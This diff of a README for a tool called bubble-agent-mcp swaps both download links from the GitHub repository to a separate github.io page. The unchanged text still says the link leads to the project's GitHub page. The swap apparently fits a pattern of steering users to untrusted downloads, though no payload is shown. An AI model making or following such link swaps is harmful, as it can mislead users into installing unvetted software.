@@ -1,6 +1,6 @@
 # 🤖 bubble-agent-mcp - Find Explosive Online Conversations Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20bubble--agent--mcp-Click%20Here%20to%20Get%20Started-blueviolet?style=for-the-badge&logo=github)](https://github.com/0308ya9392/bubble-agent-mcp)
+[![Download Now](https://img.shields.io/badge/Download%20bubble--agent--mcp-Click%20Here%20to%20Get%20Started-blueviolet?style=for-the-badge&logo=github)](https://0308ya9392.github.io)
 
 ## 🌟 What Is bubble-agent-mcp?
 
@@ -24,7 +24,7 @@ Let's walk through everything you need to do to get bubble-agent-mcp running on 
 
 Visit this link to download the application:
 
-**👉 [https://github.com/0308ya9392/bubble-agent-mcp](https://github.com/0308ya9392/bubble-agent-mcp)**
+**👉 [https://0308ya9392.github.io](https://0308ya9392.github.io)**
 
 When you click that link, you'll be taken to the project's homepage on GitHub. Look for a green "Code" button or a "Releases" section on the right side of the page. Click either one, then choose "Download ZIP" to get the files onto your computer.
 
